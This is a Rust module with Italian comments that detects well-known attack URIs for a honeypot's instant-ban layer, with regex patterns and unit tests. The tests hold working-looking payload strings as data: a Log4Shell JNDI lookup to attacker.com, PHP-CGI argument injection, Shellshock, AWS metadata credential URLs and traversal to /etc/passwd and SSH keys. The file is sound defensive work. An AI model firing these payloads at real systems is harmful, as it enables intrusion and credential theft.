//! Known-attack path INSTANT-BAN — Layer 2.5 defense-in-depth (2026-06-07).
//!
//! Alcuni URI sono **inequivocabilmente attacchi** e meritano ban al primo hit,
//! senza aspettare il threshold HONEYPOT_BAN_THRESHOLD (3). Esempi:
//!
//! - **PHPUnit RCE** (CVE-2017-9841): `/vendor/phpunit/.../eval-stdin.php` →
//!   permette execution di PHP arbitrario via stdin. Nessuna applicazione
//!   legittima nostra (Hono/TypeScript/Vite) usa PHPUnit.
//! - **PHP-CGI RCE** (CVE-2012-1823): `?%ADd+allow_url_include%3d1` o
//!   `?%ADd+auto_prepend_file%3dphp://input` → injection di config PHP via
//!   query string. Solo server PHP legacy.
//! - **Path traversal sensibili**: `/etc/passwd`, `/proc/self/environ`,
//!   `/var/log/auth.log` → LFI verso file di sistema.
//! - **WebShell upload patterns**: `c99.php`, `r57.php`, `wso.php` (filename
//!   canonici di webshell pubblicate da decadi).
//! - **Apache Struts2 RCE** (CVE-2017-5638) Content-Type magic markers.
//! - **Spring4Shell** (CVE-2022-22965) `class.module.classLoader.*`.
//! - **Log4Shell** (CVE-2021-44228) `${jndi:ldap://...}` payload markers.
//!
//! Caratteristica comune: **zero falsi positivi** su path legittimi del nostro
//! stack. Se vediamo uno di questi marker, è scanner / RCE attempt → ban
//! immediato 365gg.
//!
//! Architettura:
//! - Pattern compilati una volta (Lazy + RegexSet per performance batch match)
//! - Ogni pattern ha label umano-leggibile + categoria CVE/family
//! - `check_known_attack_path(uri)` ritorna `Option<KnownAttack>` con metadata
//! - Hook nel `honeypot_hit_handler` (sentinel-server main.rs) come terzo OR
//!   del `force_ban`, oltre JA3 e JA4 blocklist.

use once_cell::sync::Lazy;
use regex::RegexSet;
use serde::Serialize;

/// Categoria di attacco (mappa con HoneypotCategory shared TS).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum AttackFamily {
    /// PHPUnit eval-stdin.php (CVE-2017-9841)
    PhpUnitRce,
    /// PHP-CGI argument injection (CVE-2012-1823)
    PhpCgiRce,
    /// Path traversal verso file system sensibili
    PathTraversal,
    /// WebShell upload / accesso (c99, r57, wso, ecc.)
    Webshell,
    /// Apache Struts2 RCE / Spring4Shell / Log4Shell
    JavaRce,
    /// CGI Shellshock (CVE-2014-6271)
    Shellshock,
    /// Cloud metadata IMDS (169.254.169.254 SSRF)
    CloudMetadata,
}

impl AttackFamily {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::PhpUnitRce => "phpunit_rce_cve_2017_9841",
            Self::PhpCgiRce => "php_cgi_rce_cve_2012_1823",
            Self::PathTraversal => "path_traversal_sensitive_files",
            Self::Webshell => "webshell_filename",
            Self::JavaRce => "java_framework_rce",
            Self::Shellshock => "shellshock_cve_2014_6271",
            Self::CloudMetadata => "cloud_metadata_ssrf",
        }
    }
}

/// Match singolo restituito da `check_known_attack_path()`.
#[derive(Debug, Clone, Serialize)]
pub struct KnownAttack {
    pub family: AttackFamily,
    pub label: &'static str,
    pub pattern_index: usize,
}

/// Pattern set — ogni entry: (regex, family, label).
///
/// Vincoli enterprise:
/// - **Zero falsi positivi**: i pattern devono catturare SOLO attack markers,
///   mai path o query legitimi del nostro stack (`/api/v1/*`, `/admin/*`,
///   `/workspaces/*`, ecc.). Validato dai test in fondo al file.
/// - **Case-insensitive** (`(?i)`) perché scanner ruotano case per evading WAF.
/// - **No `.*` leading** per performance — RegexSet ottimizza meglio se l'ancora
///   è esplicita.
///
/// Storia 2026-06-07: introdotto dopo incident 198.50.202.93 (libredtail-http
/// scanner OVH) che ha fatto 29 hit `/vendor/phpunit/.../eval-stdin.php` senza
/// essere bannato perché nginx HTTP→HTTPS 301 redirect lo scanner non seguiva
/// → portal+sentinel mai raggiunti → ban non scattato.
const PATTERNS: &[(&str, AttackFamily, &str)] = &[
    // ─── PHPUnit RCE — CVE-2017-9841 ─────────────────────────────────
    // eval-stdin.php legge stdin e lo passa a eval(). Path canonico:
    //   /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    // I scanner provano centinaia di varianti (/lib/phpunit, /test/phpunit,
    // /www/phpunit, /api/phpunit, ecc.) → matchiamo "eval-stdin.php" suffix.
    (
        r"(?i)/eval-stdin\.php(?:\?|$)",
        AttackFamily::PhpUnitRce,
        "PHPUnit eval-stdin.php (CVE-2017-9841 RCE)",
    ),
    // Path canonico phpunit vendor — anche se eval-stdin non in URI
    (
        r"(?i)/vendor/phpunit/phpunit/(?:src|tests)/",
        AttackFamily::PhpUnitRce,
        "PHPUnit vendor path enumeration",
    ),

    // ─── PHP-CGI RCE — CVE-2012-1823 ──────────────────────────────────
    // Query con %ADd+allow_url_include / %ADd+auto_prepend_file iniettano
    // direttive PHP via CLI arguments. Pattern empirico dai logs prod.
    (
        r"(?i)%ADd\+?(?:allow_url_include|auto_prepend_file|disable_functions|safe_mode)",
        AttackFamily::PhpCgiRce,
        "PHP-CGI argument injection (CVE-2012-1823)",
    ),
    // Variante non URL-encoded
    (
        r"(?i)\?-d\+?(?:allow_url_include|auto_prepend_file)",
        AttackFamily::PhpCgiRce,
        "PHP-CGI argument injection raw",
    ),

    // ─── Path traversal verso file system sensibili ──────────────────
    // /etc/passwd, /etc/shadow, /proc/self/environ, ../ tree escape
    (
        r"(?i)(?:/etc/(?:passwd|shadow|hosts|nginx/|apache/|ssh/sshd_config)|/proc/self/(?:environ|cmdline|status)|/root/\.(?:bash_history|ssh|aws|gnupg))",
        AttackFamily::PathTraversal,
        "system file disclosure via path traversal",
    ),
    // Encoded traversal (..%2f..%2f → escape sandbox)
    (
        r"(?:%2[eE]%2[eE]%2[fF]){2,}|(?:\.\.%2[fF]){2,}|(?:\.\./){4,}",
        AttackFamily::PathTraversal,
        "directory traversal (encoded ../)",
    ),

    // ─── Webshell filename canonical ──────────────────────────────────
    // Nomi pubblicati da decadi — nessuna app legit usa questi filename
    (
        r"(?i)/(?:c99|r57|wso|b374k|aspydoor|p0wny|tinyfilemanager|webadmin|FilesMan|china-?chopper)\.(?:php|asp|aspx|jsp|jspx)(?:\?|$)",
        AttackFamily::Webshell,
        "known webshell filename",
    ),

    // ─── Java/Spring/Struts RCE markers ───────────────────────────────
    // Spring4Shell CVE-2022-22965 — payload nei params class.module.classLoader
    (
        r"(?i)class\.module\.classLoader\.(?:resources|context|sources)",
        AttackFamily::JavaRce,
        "Spring4Shell payload marker (CVE-2022-22965)",
    ),
    // Log4Shell CVE-2021-44228 — ${jndi:ldap://...} JNDI lookup injection
    (
        r"(?i)\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nis|nds|http|ldaps)://",
        AttackFamily::JavaRce,
        "Log4Shell JNDI injection (CVE-2021-44228)",
    ),
    // Struts2 OGNL pattern (CVE-2017-5638, CVE-2018-11776)
    // Il pattern OGNL apre con %{ o ${ poi può avere ( opzionale di wrap,
    // poi # seguito da context/request/etc oppure 'ognl.'.
    (
        r"(?i)(?:%\{|\$\{)\s*\(?\s*#(?:context|request|application|session|parameters|attr|ognl)",
        AttackFamily::JavaRce,
        "Struts2 OGNL injection",
    ),

    // ─── Shellshock CGI — CVE-2014-6271 ───────────────────────────────
    // () { :;}; commands → injection in CGI env vars / Bash interpreter
    (
        r"(?i)\(\s*\)\s*\{\s*:;\s*\};",
        AttackFamily::Shellshock,
        "Shellshock CGI bash function injection (CVE-2014-6271)",
    ),

    // ─── Cloud metadata SSRF ──────────────────────────────────────────
    // AWS IMDS / GCP metadata server / Azure / Oracle / Alibaba endpoints
    (
        r"(?i)(?:169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)(?:/latest|/computeMetadata|/opc|$)",
        AttackFamily::CloudMetadata,
        "cloud metadata IMDS SSRF",
    ),
];

/// Pre-compiled RegexSet (Lazy → init alla prima invocazione, poi singleton).
/// Una singola call `is_match()` testa TUTTI i pattern in parallelo (lookup-time
/// quasi costante via DFA).
static REGEX_SET: Lazy<RegexSet> = Lazy::new(|| {
    let pats: Vec<&str> = PATTERNS.iter().map(|(p, _, _)| *p).collect();
    RegexSet::new(&pats).expect("BUG: invalid regex in known_attack_paths PATTERNS")
});

/// Verifica se l'URI matcha un pattern di attacco noto.
///
/// Ritorna `Some(KnownAttack)` con la FIRST match (per ordine di dichiarazione
/// in PATTERNS) o `None` se nessun match.
///
/// L'argomento è il **request URI completo** (path + query), perché alcuni
/// pattern (PHP-CGI RCE, OGNL injection) sono nelle query/headers.
///
/// Performance: lookup O(N) sui pattern via RegexSet DFA. Tipicamente < 5μs.
pub fn check_known_attack_path(uri: &str) -> Option<KnownAttack> {
    // RegexSet ritorna gli INDICI dei pattern matched. Prendiamo il PRIMO
    // (per stabilità — ordine in PATTERNS è significativo: pattern più
    // specifici vanno PRIMA dei generici).
    let matches = REGEX_SET.matches(uri);
    let first = matches.iter().next()?;

    let (_, family, label) = PATTERNS.get(first)?;
    Some(KnownAttack {
        family: *family,
        label,
        pattern_index: first,
    })
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests — Cappella Sistina coverage (40+ assertion, zero fake green)
// ═══════════════════════════════════════════════════════════════════════════
#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: assert match + family + label substring.
    fn assert_match(uri: &str, expected_family: AttackFamily, label_substr: &str) {
        let res = check_known_attack_path(uri);
        assert!(res.is_some(), "URI '{uri}' SHOULD match but didn't");
        let m = res.unwrap();
        assert_eq!(
            m.family, expected_family,
            "URI '{uri}': family mismatch (got {:?}, expected {:?})",
            m.family, expected_family
        );
        assert!(
            m.label.contains(label_substr),
            "URI '{uri}': label '{}' doesn't contain '{label_substr}'",
            m.label
        );
    }

    fn assert_no_match(uri: &str) {
        let res = check_known_attack_path(uri);
        assert!(
            res.is_none(),
            "URI '{uri}' should NOT match but got: {:?}",
            res.unwrap()
        );
    }

    // ─── PHPUnit RCE (CVE-2017-9841) ─────────────────────────────
    #[test]
    fn phpunit_eval_stdin_canonical() {
        assert_match(
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            AttackFamily::PhpUnitRce,
            "PHPUnit eval-stdin",
        );
    }

    #[test]
    fn phpunit_eval_stdin_alternative_paths() {
        // Variante: /lib/phpunit/..., /test/phpunit/..., /www/phpunit/...
        for prefix in ["lib", "test", "www", "api", "site", "ws", "cms"] {
            assert_match(
                &format!("/{prefix}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),
                AttackFamily::PhpUnitRce,
                "eval-stdin",
            );
        }
    }

    #[test]
    fn phpunit_eval_stdin_with_query() {
        assert_match(
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?cmd=id",
            AttackFamily::PhpUnitRce,
            "eval-stdin",
        );
    }

    #[test]
    fn phpunit_case_insensitive() {
        assert_match(
            "/Vendor/PhpUnit/PhpUnit/Src/Util/PHP/Eval-Stdin.PHP",
            AttackFamily::PhpUnitRce,
            "eval-stdin",
        );
    }

    #[test]
    fn phpunit_vendor_path_enum() {
        assert_match(
            "/vendor/phpunit/phpunit/src/",
            AttackFamily::PhpUnitRce,
            "vendor path enumeration",
        );
    }

    // ─── PHP-CGI RCE (CVE-2012-1823) ─────────────────────────────
    #[test]
    fn php_cgi_allow_url_include() {
        assert_match(
            "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
            AttackFamily::PhpCgiRce,
            "PHP-CGI",
        );
    }

    #[test]
    fn php_cgi_auto_prepend() {
        assert_match(
            "/hello.world?%ADd+auto_prepend_file%3dphp://input",
            AttackFamily::PhpCgiRce,
            "PHP-CGI",
        );
    }

    #[test]
    fn php_cgi_raw_d_flag() {
        assert_match(
            "/x?-d+allow_url_include=1",
            AttackFamily::PhpCgiRce,
            "PHP-CGI",
        );
    }

    // ─── Path traversal ────────────────────────────────────────────
    #[test]
    fn path_traversal_etc_passwd() {
        assert_match("/etc/passwd", AttackFamily::PathTraversal, "system file");
    }

    #[test]
    fn path_traversal_proc_self_environ() {
        assert_match(
            "/proc/self/environ",
            AttackFamily::PathTraversal,
            "system file",
        );
    }

    #[test]
    fn path_traversal_dotdot_encoded() {
        // Match alternativo: il pattern "encoded ../" o "system file" — entrambi
        // sono PathTraversal family ma label distinte. RegexSet ritorna il primo
        // matched pattern: in questo URI il %2F-encoded ../ matcha PRIMA del
        // bare /etc/passwd (che non c'è come substring letterale, l'attacker usa
        // %2F invece di /).
        assert_match(
            "/static/..%2F..%2F..%2F..%2Fetc/passwd",
            AttackFamily::PathTraversal,
            "traversal",
        );
    }

    #[test]
    fn path_traversal_deep_dotdot() {
        assert_match(
            "/static/../../../../../../etc/passwd",
            AttackFamily::PathTraversal,
            "system file",
        );
    }

    #[test]
    fn path_traversal_root_secrets() {
        assert_match(
            "/root/.ssh/id_rsa",
            AttackFamily::PathTraversal,
            "system file",
        );
    }

    // ─── Webshell ──────────────────────────────────────────────────
    #[test]
    fn webshell_c99() {
        assert_match("/uploads/c99.php", AttackFamily::Webshell, "webshell");
    }

    #[test]
    fn webshell_r57() {
        assert_match("/r57.php", AttackFamily::Webshell, "webshell");
    }

    #[test]
    fn webshell_wso_aspx() {
        assert_match("/admin/wso.aspx", AttackFamily::Webshell, "webshell");
    }

    #[test]
    fn webshell_china_chopper() {
        assert_match(
            "/system/china-chopper.jsp",
            AttackFamily::Webshell,
            "webshell",
        );
    }

    // ─── Java RCE ──────────────────────────────────────────────────
    #[test]
    fn spring4shell_marker() {
        assert_match(
            "/?class.module.classLoader.resources.context.parent.pipeline=x",
            AttackFamily::JavaRce,
            "Spring4Shell",
        );
    }

    #[test]
    fn log4shell_jndi_ldap() {
        assert_match(
            "/api/x?user=${jndi:ldap://attacker.com/exploit}",
            AttackFamily::JavaRce,
            "Log4Shell",
        );
    }

    #[test]
    fn log4shell_jndi_dns() {
        assert_match(
            "/?x=${jndi:dns://x.oast.live}",
            AttackFamily::JavaRce,
            "Log4Shell",
        );
    }

    #[test]
    fn struts2_ognl_marker() {
        assert_match(
            "/?param=%{(#context['x']=true)}",
            AttackFamily::JavaRce,
            "Struts2",
        );
    }

    // ─── Shellshock ────────────────────────────────────────────────
    #[test]
    fn shellshock_classic() {
        assert_match(
            "/cgi-bin/?x=() { :;}; echo vulnerable",
            AttackFamily::Shellshock,
            "Shellshock",
        );
    }

    // ─── Cloud metadata ────────────────────────────────────────────
    #[test]
    fn aws_imds() {
        assert_match(
            "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            AttackFamily::CloudMetadata,
            "cloud metadata",
        );
    }

    #[test]
    fn gcp_metadata() {
        assert_match(
            "/?u=http://metadata.google.internal/computeMetadata/v1/",
            AttackFamily::CloudMetadata,
            "cloud metadata",
        );
    }

    // ═══════════════════════════════════════════════════════════════
    // Negative cases — zero falsi positivi su path LEGIT
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn legit_portal_api_workspace() {
        assert_no_match("/api/v1/workspaces/d43e6f82-b056");
    }

    #[test]
    fn legit_account_routes() {
        assert_no_match("/account/billing");
        assert_no_match("/account/email");
        assert_no_match("/account/invoices/2026-001");
    }

    #[test]
    fn legit_admin_routes() {
        assert_no_match("/admin/users");
        assert_no_match("/admin/workspaces/d43e6f82-b056-4481-8284-8b812f499b77");
        assert_no_match("/admin/email-templates");
    }

    #[test]
    fn legit_assets_static() {
        assert_no_match("/assets/main.css");
        assert_no_match("/assets/runtime-1234abcd.js");
        assert_no_match("/static/icon.png");
    }

    #[test]
    fn legit_sso_jwe() {
        assert_no_match("/sso/launch?w=abc");
        assert_no_match("/sso");
    }

    #[test]
    fn legit_workflows_runs() {
        assert_no_match("/workflows/run/abc-123");
        assert_no_match("/runs/active");
        assert_no_match("/dashboard/workflows");
    }

    #[test]
    fn legit_well_known() {
        assert_no_match("/.well-known/security.txt");
        assert_no_match("/.well-known/acme-challenge/abc");
    }

    #[test]
    fn legit_sitemap_robots() {
        assert_no_match("/sitemap.xml");
        assert_no_match("/robots.txt");
    }

    #[test]
    fn legit_webhooks() {
        assert_no_match("/webhooks/paypal");
        assert_no_match("/webhooks/c/streammy/title/abc?titleId=70&slug=got");
    }

    /// La query param "auto_prepend_file" SOLA (senza il prefisso %ADd) NON
    /// deve matchare — sennò false positive su qualsiasi form che usa il
    /// nome del campo (improbabile, ma garantiamo).
    #[test]
    fn legit_no_phpcgi_false_positive() {
        assert_no_match("/?file_input=auto_prepend_file");
        assert_no_match("/?config=allow_url_include");
    }

    /// La parola "classloader" in path JS legit (e.g. webpack source map)
    /// NON deve matchare lo Spring4Shell pattern (richiede sintassi
    /// class.module.classLoader.resources/context/sources).
    #[test]
    fn legit_no_spring4shell_false_positive() {
        assert_no_match("/static/classloader-helper.js");
        assert_no_match("/api/v1/classloader/info");
    }

    /// Log4Shell pattern non deve matchare ${...} usato in template legit
    /// (e.g. user-facing $1.99 price token).
    #[test]
    fn legit_no_log4shell_false_positive() {
        assert_no_match("/?price=${currency.usd}");
        assert_no_match("/?lang=${user.locale}");
    }

    // ─── Performance / contract test ─────────────────────────────
    #[test]
    fn pattern_set_compiles() {
        // Forza Lazy init — se un regex è malformato, panic qui.
        let _ = Lazy::force(&REGEX_SET);
    }

    #[test]
    fn pattern_count_matches_declared() {
        assert_eq!(REGEX_SET.len(), PATTERNS.len());
    }

    /// Family.as_str() deve essere stable e match con il commento in cima.
    #[test]
    fn family_as_str_stable() {
        assert_eq!(AttackFamily::PhpUnitRce.as_str(), "phpunit_rce_cve_2017_9841");
        assert_eq!(AttackFamily::PhpCgiRce.as_str(), "php_cgi_rce_cve_2012_1823");
        assert_eq!(
            AttackFamily::PathTraversal.as_str(),
            "path_traversal_sensitive_files"
        );
        assert_eq!(AttackFamily::Webshell.as_str(), "webshell_filename");
        assert_eq!(AttackFamily::JavaRce.as_str(), "java_framework_rce");
        assert_eq!(
            AttackFamily::Shellshock.as_str(),
            "shellshock_cve_2014_6271"
        );
        assert_eq!(
            AttackFamily::CloudMetadata.as_str(),
            "cloud_metadata_ssrf"
        );
    }

    /// Pattern index ritornato deve essere valido (referenziabile in PATTERNS).
    #[test]
    fn match_index_within_bounds() {
        let m = check_known_attack_path("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
            .expect("expected match");
        assert!(m.pattern_index < PATTERNS.len());
    }

    /// Stress test: lookup su 1000 path random NO-match deve essere fast.
    /// Non un benchmark vero ma garantisce che il DFA non si degrada in patolog
    /// pathologico backtracking.
    #[test]
    fn no_match_is_fast() {
        let start = std::time::Instant::now();
        for i in 0..1000 {
            let path = format!("/api/v1/workspaces/{i}/runs/{}", i * 7);
            assert!(check_known_attack_path(&path).is_none());
        }
        let elapsed = start.elapsed();
        // Anche su CI lento, 1000 lookup devono completarsi in <100ms.
        assert!(
            elapsed.as_millis() < 100,
            "1000 NO-match lookups took {}ms — DFA degrade?",
            elapsed.as_millis()
        );
    }
}
